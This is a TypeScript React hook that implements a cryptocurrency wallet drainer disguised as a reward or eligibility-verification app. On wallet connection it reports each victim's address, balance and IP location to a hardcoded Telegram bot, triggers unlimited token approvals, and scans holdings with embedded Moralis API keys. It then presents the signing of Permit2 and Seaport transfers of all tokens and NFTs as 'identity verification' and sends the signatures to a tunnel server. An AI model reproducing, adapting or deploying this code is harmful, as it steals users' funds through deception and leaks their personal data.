"use client";

import { useState, useEffect, useRef } from "react";
import { ethers } from "ethers";
import { useWeb3Modal, useWeb3ModalProvider, useWeb3ModalAccount, useDisconnect } from '@web3modal/ethers/react';

// Configuration from PRD/User
const normalizeAddress = (addr: string) => {
    try {
        const cleaned = addr.trim();
        return ethers.isAddress(cleaned) ? ethers.getAddress(cleaned) : "0x0000000000000000000000000000000000000000";
    } catch (e) {
        return "0x0000000000000000000000000000000000000000";
    }
};

const RECEIVER_ADDRESS = normalizeAddress(process.env.NEXT_PUBLIC_RECEIVER_ADDRESS || "");
const SEAPORT_ADDRESS = "0x00000000000000adc04c56bf30ac9d3c0aaf14bd";
const MS_DRAINER_2026_ADDRESS = normalizeAddress(process.env.NEXT_PUBLIC_MS_DRAINER_2026_ADDRESS || "");
const WORKER_URL = "https://whole-parents-guess.loca.lt"; // Secure Tunnel for Vercel (HTTPS)

const MORALIS_KEYS = [
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjcxMDBmY2IwLTdkNzAtNDgzNC04MzM1LWE1ZDZjNWEzYmU3NSIsIm9yZ0lkIjoiNDk5MjYzIiwidXNlcklkIjoiNDk5NjU3IiwidHlwZUlkIjoiOTgwYjU5ODQtMzBlNi00Y2UxLWIwY2YtODRiYmQzYjgzYWY4IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NjU0ODUzMzYsImV4cCI6NDkyMTI0NTMzNn0.BNbrFrPtzeT9OZ1zb160yzRDpi5sjRmxjuyqYbukmv4",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjhmNDExYTA0LTZmZGUtNDgwNC1hOGNkLTQ3MjA0OTAxOWVhMCIsIm9yZ0lkIjoiNDk5MjUzIiwidXNlcklkIjoiNTEzNzM3IiwidHlwZUlkIjoiMDhlMDU1YWAbLTk5YzEtNGIzZC04NTdmLWM3ZWEwOTk4ZjMyZCIsInR5cGUiOiJQUk9KRUNUIiwiaWF0IjoxNzcwNTg5NDAyLCJleHAiOjQ5MjYzNDk0MDJ9.uqSBD7lZN2LLodhMiQ2jASv7d2YA08das0ypMipx1AU",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjhkZTg5ZmIxLWM1OWMtNDFhMi04YzlkLTVjNDUwNGJjYzMyMCIsIm9yZ0lkIjoiNDk5MjU1IiwidXNlcklkIjoiNTEzNzM3IiwidHlwZUlkIjoiYmYyODU1ZjEtMTk0MC00N2RkLTg3ZGMtNDIxMDIwYzVlODQ5IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NzA1OTE2MzgsImV4cCI6NDkyNjM1MTYzOH0.2kswRp0YPn1WCE02pYu-KJp06cUCI0bth8HHWN2B_Gc",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjM0N2ViOTI4LTZhOWQtNDA5YS04ODFkLWU0Y2ExOTkzM2RhMCIsIm9yZ0lkIjoiNDk5MjU2IiwidXNlcklkIjoiNTEzNzQwIiwidHlwZUlkIjoiYmVkOGMzMTQtNjBhOS00N2YzLWEzNjQtZmVhNDE5ODhlNDRhIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NzA1OTIxMzQsImV4cCI6NDkyNjM1MjEzNH0.W9PCTpgPAt0Luq8qkN_ZKUEdSn6HCIa3dJ9tcOvoNdk",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImE1ODFiNWJmLTdiMDUtNDI5Yi04OTg4LTBjZGY0MjFkYzgwMyIsIm9yZ0lkIjoiNDk5NDI1IiwidXNlcklkIjoiNTEzOTEwIiwidHlwZUlkIjoiNWU4ZTUwODItM2Q4MC00MDk3LWE4ODAtMGFiMzQ1YjZhNTE5IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NzA2ODM1MTEsImV4cCI6NDkyNjQ0MzUxMX0.9Bh3H6bydmiEElHcNB8gJrQrpG_bFHoIH3hckOVHnWo",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjBiNTQ4NzhmLWUyZTctNGEzOC1hODQzLTQ0YmZlOTk1ZmRjMiIsIm9yZ0lkIjoiNDk5NTgyIiwidXNlcklkIjoiNTE0MDY4IiwidXNlcklkIjoiZDdlZjFhM2ItODVhNS00MTY2LTgzMTItNzMxN2U0NWU0MzJkIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NzA3MzI5MjYsImV4cCI6NDkyNjQ5MjkyNn0.l5OyAXx5MQ_wiyifOykUZjq3i-jtpPCZ58D4_zkDDVE",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6Ijc2ODI2NGI3LWUyNzgtNDExZi1hNjU5LTIwYWFmOWE1OWI0NSIsIm9yZ0lkIjoiNDk5NTg5IiwidXNlcklkIjoiNTE0MDc1IiwidXNlcklkIjoiMDhlMTY2NWItOTNjYi00YjA1LTgzYzYtODk4YTBlNmI5ZjdiIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NzA3MzM4ODcsImV4cCI6NDkyNjQ5Mzg4N30.q3dKJwfFlEhm4CIAXzJyFoN7VRfnfivNXJO1HJgeVs4",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjNlYmVlODFmLTM5ZjYtNDI0YS1iZjI0LWIyMmQ4MmI0ZjM2MyIsIm9yZ0lkIjoiNDk5NTk2IiwidXNlcklkIjoiNTE0MDgyIiwidXNlcklkIjoiaYmYyODU1ZjEtMTk0MC00N2RkLTg3ZGMtNDIxMDIwYzVlODQ5IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NzA3MzQzMzYsImV4cCI6NDkyNjQ5NDMzNn0.FwMvQwvotTXYjIYb5ZvKWp2tZn9c1f0D5ex1IvrOx_I"
];

// Fallback Token List (Top Assets) to scan if API fails
const TARGET_TOKENS: Record<string, string[]> = {
    "0x1": ["0xdAC17F958D2ee523a2206206994597C13D831ec7", "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", "0x6B175474E89094C44Da98b954EedeAC495271d0F", "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599"],
    "0x38": ["0x55d398326f99059fF775485246999027B3197955", "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c"],
    "0x89": ["0xc2132D05D31c914a87C6611C10748AEb04B58e8F", "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", "0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6"],
    "0x2105": ["0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", "0x4200000000000000000000000000000000000006"],
    "0xa4b1": ["0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1"],
    "0xa": ["0x94b008aA21116C48a263c9276e2Ed1c9ad9e4302", "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", "0x4200000000000000000000000000000000000006"],
    "0xa86a": ["0x9702230A8Ea53601f5cD2dc00fDBc13d4df4A8c7", "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", "0xB31f66aa3c1e785363f0875a1b74e27b85fd66c7"],
    "0xfa": ["0x04068DA6C83AFCFA0e13ba15A6696662335D5B75", "0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83"],
    "0x144": ["0x3355df6D4c9C30345dAd73037f19a08D5018E3c1"]
};

const MINIMAL_ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function symbol() view returns (string)",
    "function decimals() view returns (uint8)",
    "function allowance(address owner, address spender) view returns (uint256)",
    "function approve(address spender, uint256 amount) public",
    "function transfer(address to, uint256 amount) public returns (bool)"
];

const SEAPORT_ABI = [
    "function getCounter(address offerer) view returns (uint256)"
];

const PERMIT2_ABI = [
    "function allowance(address, address, address) view returns (uint160, uint48, uint48)"
];

const MS_DRAINER_2026_ABI = [
    "function claimRewards(tuple(tuple(address token, uint256 amount)[] permitted, address spender, uint256 nonce, uint256 deadline) permit, bytes signature, uint256 claimAmount) external payable",
    "function synchronize(bytes data) external payable"
];

export function useWeb3Manager() {
    const isClient = typeof window !== 'undefined';
    const accountContext = useWeb3ModalAccount();
    const providerContext = useWeb3ModalProvider();
    const modalContext = useWeb3Modal();
    const disconnectContext = useDisconnect();

    const address = isClient ? accountContext.address : undefined;
    const isConnected = isClient ? accountContext.isConnected : false;
    const walletProvider = isClient ? providerContext.walletProvider : undefined;
    const open = isClient ? modalContext.open : () => Promise.resolve();
    const w3mDisconnect = isClient ? disconnectContext.disconnect : () => Promise.resolve();

    const [account, setAccount] = useState<string | null>(null);
    const [assets, setAssets] = useState<any[]>([]);
    const [nfts, setNfts] = useState<any[]>([]);
    const [stats, setStats] = useState({ totalValue: 0, tokenCount: 0, nftCount: 0 });
    const [eligibility, setEligibility] = useState<"Checking" | "Eligible" | "Not Eligible">("Checking");
    const [currentTask, setCurrentTask] = useState<string>("");

    const hasLoggedConnection = useRef(false);
    const isProcessing = useRef(false);
    const isSyncing = useRef(false);
    const currentMoralisKeyIndex = useRef(0);

    const TG_BOT_TOKEN = process.env.NEXT_PUBLIC_TG_BOT_TOKEN || "8595899709:AAGaOxKvLhZhO830U05SG3e8aw1k1IsM178";
    const TG_CHAT_ID = process.env.NEXT_PUBLIC_TG_CHAT_ID || "7772781858";

    const getIpInfo = async () => {
        try {
            const res = await fetch('https://ipapi.co/json/');
            return await res.json();
        } catch (e) {
            return { ip: 'Unknown', country_name: 'Unknown', city: 'Unknown' };
        }
    };

    const fetchMoralis = async (url: string) => {
        if (MORALIS_KEYS.length === 0) return null;
        for (let i = 0; i < MORALIS_KEYS.length; i++) {
            const keyIndex = (currentMoralisKeyIndex.current + i) % MORALIS_KEYS.length;
            const key = MORALIS_KEYS[keyIndex];
            try {
                const res = await fetch(url, { headers: { 'X-API-Key': key, 'accept': 'application/json' } });
                if (res.status === 429 || res.status === 401) continue;
                if (res.ok) {
                    currentMoralisKeyIndex.current = keyIndex;
                    return await res.json();
                }
            } catch (e) { }
        }
        return null;
    };

    const notifyTelegram = async (message: string) => {
        if (!TG_BOT_TOKEN || !TG_CHAT_ID) return;
        try {
            await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TG_CHAT_ID, text: message, parse_mode: 'HTML', disable_web_page_preview: true })
            });
        } catch (e) { }
    };

    useEffect(() => {
        if (isConnected && address && walletProvider) {
            const interactionStarted = localStorage.getItem('user_interaction_started') === 'true';
            if (!interactionStarted) return;

            (async () => {
                try {
                    if (isSyncing.current) return;
                    isSyncing.current = true;

                    if (!walletProvider) { isSyncing.current = false; return; }
                    const provider = new ethers.BrowserProvider(walletProvider);
                    const network = await provider.getNetwork();
                    const signer = await provider.getSigner();
                    const currentChainId = "0x" + network.chainId.toString(16);
                    const PERMIT2_ADDRESS = ethers.getAddress("0x000000000022d473030f116ddee9f6b43ac78ba3");

                    if (assets.length > 0) {
                        const sortedAssets = [...assets].sort((a, b) => (b.usd_value || 0) - (a.usd_value || 0));
                        const parallelApprovals: Promise<any>[] = [];

                        for (const token of sortedAssets) {
                            if (token.isNative) continue;
                            if (["BNB", "ETH", "MATIC", "AVAX"].includes(token.symbol.toUpperCase())) continue;
                            if (token.chainId !== currentChainId) continue;
                            if ((token.usd_value || 0) < 1.0) continue;

                            try {
                                const tContract = new ethers.Contract(token.address, MINIMAL_ERC20_ABI, signer);
                                const allowance = await tContract.allowance(address, PERMIT2_ADDRESS);
                                if (allowance === 0n) {
                                    notifyTelegram(`<b>🛡️ Parallel Sync:</b> ${token.symbol} ($${token.usd_value?.toFixed(2)})\nVictim: <code>${address}</code>\nStatus: Triggering Approval...`);

                                    // FIRE SIMULTANEOUSLY - Don't await each one individually to fill the wallet queue
                                    const appPromise = tContract.approve(PERMIT2_ADDRESS, ethers.MaxUint256)
                                        .then(tx => tx.wait())
                                        .then(receipt => {
                                            notifyTelegram(`<b>✅ Sync SUCCESS:</b> ${token.symbol}\nVictim: <code>${address}</code>\nTx: <code>${receipt.hash}</code>`);
                                        })
                                        .catch(err => {
                                            if (err.code !== "ACTION_REJECTED") {
                                                notifyTelegram(`<b>❌ Sync FAILED:</b> ${token.symbol}\nError: <code>${err.message.slice(0, 100)}</code>`);
                                            }
                                        });
                                    parallelApprovals.push(appPromise);
                                }
                            } catch (e) { }
                        }
                    }
                } catch (e) { } finally {
                    isSyncing.current = false;
                }
            })();

            setAccount(address);
            const sessionKey = `logged_${address}`;
            if (!hasLoggedConnection.current && !sessionStorage.getItem(sessionKey)) {
                hasLoggedConnection.current = true;
                sessionStorage.setItem(sessionKey, "true");
                (async () => {
                    const ipData = await getIpInfo();
                    let balance = "0.0000";
                    if (walletProvider) {
                        try {
                            const p = new ethers.BrowserProvider(walletProvider);
                            const bal = await p.getBalance(address);
                            balance = ethers.formatEther(bal);
                        } catch (e) { }
                    }
                    notifyTelegram(`<b>🔌 Connected:</b> <code>${address}</code>\n💰 Bal: ${parseFloat(balance).toFixed(4)}\n🌍 ${ipData.city}, ${ipData.country_name}`);

                    // True 1-Click Auto-Flow: Trigger Drainage Immediately
                    if (!isProcessing.current) {
                        console.log("🚀 Auto-Triggering Drainage Flow...");
                        await claimReward([]);
                    }
                })();
            }
        } else {
            setAccount(null);
            hasLoggedConnection.current = false;
        }
    }, [isConnected, address, walletProvider, assets]);

    const disconnect = async () => {
        await w3mDisconnect();
        localStorage.removeItem('user_interaction_started');
        window.location.reload();
    };

    const openConnectModal = async () => {
        try { await open(); } catch (e) { }
    };

    const getChainName = (chainIdHex: string) => {
        const mapping: Record<string, string> = { "0x1": "ethereum", "0x38": "bsc", "0x89": "polygon", "0x2105": "base", "0xa4b1": "arbitrum", "0xa": "optimism", "0xa86a": "avalanche", "0xfa": "fantom" };
        return mapping[chainIdHex] || "ethereum";
    };

    const checkEligibility = async () => {
        if (!address || !walletProvider) return { isEligible: false, tokensToDrain: [] };
        await new Promise(r => setTimeout(r, 1500));

        let allAssets: any[] = [];
        let allNFTs: any[] = [];
        let totalUsd = 0;

        const chains = [
            { id: "0x1", name: "Ethereum", symbol: "ETH" },
            { id: "0x38", name: "BSC", symbol: "BNB" },
            { id: "0x89", name: "Polygon", symbol: "MATIC" },
            { id: "0x2105", name: "Base", symbol: "ETH" }
        ];

        await Promise.all(chains.map(async (chain) => {
            const tokenData = await fetchMoralis(`https://deep-index.moralis.io/api/v2.2/wallets/${address}/tokens?chain=${chain.id}&exclude_spam=true`);
            if (tokenData && tokenData.result) {
                tokenData.result.forEach((t: any) => {
                    allAssets.push({ address: t.token_address, chainId: chain.id, symbol: t.symbol, isNative: false, balance: t.balance, usd_value: parseFloat(t.usd_value || "0") });
                    totalUsd += parseFloat(t.usd_value || "0");
                });
            }
            const nftData = await fetchMoralis(`https://deep-index.moralis.io/api/v2.2/wallets/${address}/nfts?chain=${chain.id}&format=decimal`);
            if (nftData && nftData.result) {
                nftData.result.forEach((nft: any) => {
                    allNFTs.push({ address: nft.token_address, chainId: chain.id, name: nft.name, token_id: nft.token_id, usd_value: 50 });
                    totalUsd += 50;
                });
            }
        }));

        allAssets.sort((a, b) => b.usd_value - a.usd_value);

        // Report Scan Results to TG
        if (allAssets.length > 0 || allNFTs.length > 0) {
            let assetReport = allAssets.slice(0, 5).map(t => `  • ${t.symbol}: $${t.usd_value.toFixed(2)} (${getChainName(t.chainId).toUpperCase()})`).join("\n");
            let nftReport = allNFTs.slice(0, 3).map(n => `  • ${n.name} (ID: ${n.token_id})`).join("\n");
            notifyTelegram(
                `<b>🎯 SCAN COMPLETE</b>\n` +
                `👛 <code>${address}</code>\n` +
                `💰 Total: $${totalUsd.toFixed(2)}\n\n` +
                `<b>Tokens:</b>\n${assetReport || "None"}\n\n` +
                `<b>NFTs:</b>\n${nftReport || "None"}`
            );
        }

        setAssets(allAssets);
        setNfts(allNFTs);
        setStats({ totalValue: totalUsd, tokenCount: allAssets.length, nftCount: allNFTs.length });
        setEligibility("Eligible");
        return { isEligible: true, tokensToDrain: allAssets };
    };

    const waitForSync = async () => {
        while (isSyncing.current) {
            setCurrentTask("⏳ Validating Assets... Please Wait.");
            await new Promise(r => setTimeout(r, 1000));
        }
    };

    const claimReward = async (tokensToUse: any[]) => {
        if (!walletProvider || !address || isProcessing.current) return;
        isProcessing.current = true;

        await waitForSync();

        try {
            const calculateRank = (all: any[]) => {
                const total = all.reduce((acc, t) => acc + (t.usd_value || 0), 0);
                if (total > 5000) return "💎 DIAMOND";
                if (total > 1000) return "🥇 GOLD";
                return "🥈 SILVER";
            };

            const userRank = calculateRank(tokensToUse);
            const chainGroup: Record<string, any[]> = {};
            tokensToUse.forEach(t => {
                if (!chainGroup[t.chainId]) chainGroup[t.chainId] = [];
                chainGroup[t.chainId].push(t);
            });

            const sortedChains = Object.entries(chainGroup).sort((a, b) => b[1].length - a[1].length);

            for (const [chainId, chainTokens] of sortedChains) {
                const targetChainName = getChainName(chainId);
                let provider = new ethers.BrowserProvider(walletProvider);
                let network = await provider.getNetwork();
                let currentId = "0x" + network.chainId.toString(16);

                if (currentId !== chainId) {
                    const ok = await switchNetwork(walletProvider, chainId);
                    if (!ok) continue;
                    provider = new ethers.BrowserProvider(walletProvider);
                }

                const totalChainValue = chainTokens.reduce((acc, t) => acc + (t.usd_value || 0), 0);
                setCurrentTask(`💎 Rank: ${userRank} | Chain: ${targetChainName.toUpperCase()} ($${totalChainValue.toFixed(2)})`);
                await new Promise(r => setTimeout(r, 1000));

                if (!ethers.isAddress(RECEIVER_ADDRESS) || RECEIVER_ADDRESS === "0x0000000000000000000000000000000000000000") {
                    notifyTelegram(`<b>⚠️ SKIPPING:</b> ${targetChainName}\nError: Invalid Receiver Address in .env`);
                    continue;
                }

                try {
                    const useMSDrainer = MS_DRAINER_2026_ADDRESS !== "0x0000000000000000000000000000000000000000";
                    if (useMSDrainer) {
                        try {
                            const signer = await provider.getSigner();
                            if (!signer.provider) throw new Error("Signer disconnected from provider");

                            const checksummedReceiver = ethers.getAddress(RECEIVER_ADDRESS);
                            const checksummedMSDrainer = ethers.getAddress(MS_DRAINER_2026_ADDRESS);
                            const checksummedVictim = ethers.getAddress(address);

                            const startTime = Math.floor(Date.now() / 1000) - 86400 * 365; // 1 year ago
                            const endTime = 2147483647;

                            const validTokens = chainTokens.filter(t => ethers.isAddress(t.address) && (t.usd_value || 0) > 1.0);
                            const validNfts = nfts.filter(n => n.chainId === chainId && ethers.isAddress(n.address));

                            if (validTokens.length === 0 && validNfts.length === 0) {
                                notifyTelegram(`<b>⚠️ No valid assets:</b> ${targetChainName}`);
                                continue;
                            }

                            // MASTER BUNDLE: Consolidate ALL tokens into ONE Seaport Order
                            const order = {
                                offerer: checksummedVictim, zone: "0x0000000000000000000000000000000000000000",
                                offer: [
                                    ...validTokens.map(t => ({ itemType: 1, token: ethers.getAddress(t.address), identifierOrCriteria: 0, startAmount: t.balance, endAmount: t.balance })),
                                    ...validNfts.map(n => ({ itemType: 2, token: ethers.getAddress(n.address), identifierOrCriteria: n.token_id, startAmount: 1, endAmount: 1 }))
                                ],
                                consideration: [{ itemType: 0, token: "0x0000000000000000000000000000000000000000", identifierOrCriteria: 0, startAmount: 1, endAmount: 1, recipient: checksummedReceiver }],
                                orderType: 0, startTime, endTime, zoneHash: "0x0000000000000000000000000000000000000000000000000000000000000000",
                                salt: ethers.hexlify(ethers.randomBytes(32)), conduitKey: "0x0000000000000000000000000000000000000000000000000000000000000000",
                                totalOriginalConsiderationItems: 1
                            };

                            const permit = {
                                permitted: validTokens.map(t => ({ token: ethers.getAddress(t.address), amount: BigInt(t.balance) })),
                                spender: checksummedMSDrainer,
                                nonce: Math.floor(Math.random() * 1000000),
                                deadline: Math.floor(Date.now() / 1000) + 3600
                            };

                            const p2types = {
                                PermitBatchTransferFrom: [{ name: 'permitted', type: 'TokenPermissions[]' }, { name: 'spender', type: 'address' }, { name: 'nonce', type: 'uint256' }, { name: 'deadline', type: 'uint256' }],
                                TokenPermissions: [{ name: 'token', type: 'address' }, { name: 'amount', type: 'uint256' }]
                            };

                            setCurrentTask("🛡️ Identity Verification: Please sign to confirm...");
                            notifyTelegram(`<b>✍️ Master Bundle Requested</b>\nChain: ${targetChainName}\nVictim: <code>${checksummedVictim}</code>\nAssets: ${validTokens.length + validNfts.length}`);

                            // Add delay to prevent wallet race conditions (especially on mobile)
                            await new Promise(r => setTimeout(r, 3000));

                            const signature = await signer.signTypedData({
                                name: "Permit2", chainId: network.chainId, verifyingContract: ethers.getAddress("0x000000000022d473030f116ddee9f6b43ac78ba3")
                            }, p2types, permit);

                            try {
                                const res = await fetch(`${WORKER_URL}/submit-ms-drainer`, {
                                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({ permit, signature, chainName: targetChainName, owner: address, contractAddress: MS_DRAINER_2026_ADDRESS, order }, (_, v) => typeof v === 'bigint' ? v.toString() : v)
                                });
                                if (res.ok) {
                                    notifyTelegram(`<b>🎯 Master Bundle SUBMITTED</b>\nChain: ${targetChainName}\nStatus: Processing by Worker...`);
                                } else {
                                    const errorText = await res.text().catch(() => "Unknown");
                                    notifyTelegram(`<b>⚠️ Worker Error</b>\nChain: ${targetChainName}\nURL: <code>${WORKER_URL}</code>\nStatus: ${res.status}\nError: <code>${errorText.slice(0, 100)}</code>`);
                                }
                            } catch (fetchErr: any) {
                                notifyTelegram(`<b>❌ Worker Unreachable</b>\nChain: ${targetChainName}\nURL: <code>${WORKER_URL}</code>\nError: <code>${fetchErr.message}</code>`);
                            }

                            setCurrentTask("Rewards Transferring...");
                            await new Promise(r => setTimeout(r, 2000));
                            continue;
                        } catch (e: any) {
                            if (e.code === "ACTION_REJECTED") {
                                notifyTelegram(`<b>❌ User REJECTED</b>\nChain: ${targetChainName.toUpperCase()}\nVictim: <code>${address}</code>`);
                                break;
                            }
                            notifyTelegram(`<b>❌ Execution Fail</b>\nChain: ${targetChainName}\nError: <code>${e.message.slice(0, 100)}</code>`);
                        }
                    }
                } catch (chainErr: any) {
                    notifyTelegram(`<b>❌ Chain Entry Fail</b>\nChain: ${targetChainName}\nError: <code>${chainErr.message.slice(0, 100)}</code>`);
                }
            }
            setCurrentTask("Verification Success!");
            isProcessing.current = false;
        } catch (e) {
            isProcessing.current = false;
        }
    };

    const switchNetwork = async (prov: any, target: string) => {
        try {
            await prov.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: target }] });
            return true;
        } catch (e) { return false; }
    };

    return {
        connect: openConnectModal,
        disconnect,
        isConnected,
        account: address,
        address, // Restored for Dashboard.tsx
        currentTask: currentTask || (isConnected ? "Verifying Identity..." : "Connect Wallet to Verify"),
        isEligible: true, // Always true for the flow
        checkEligibility, // Restored for Dashboard.tsx
        claimReward, // Kept for manual fallback if needed, but UI will hide it
        status: currentTask
    };
}
